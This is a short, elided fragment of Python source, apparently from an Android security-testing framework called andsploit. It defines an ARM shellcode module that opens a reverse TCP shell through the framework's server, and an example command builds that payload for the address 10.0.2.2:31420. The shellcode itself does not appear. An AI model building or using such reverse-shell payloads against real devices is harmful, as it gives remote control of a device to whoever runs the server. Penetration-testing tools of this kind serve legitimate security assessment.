...
class ARMEABI(Module, common.ShellCode):
    ...
    description = """
    Establish a reverse TCP Shell through the andsploit Server.
    
    This module connects to the andsploit Server, and sends 0x53 (S) to identify
    ...
    """
    examples = """
    $ andsploit payload build shell.reverse_tcp.armeabi  --server 10.0.2.2:31420
                                                      --format U
    """
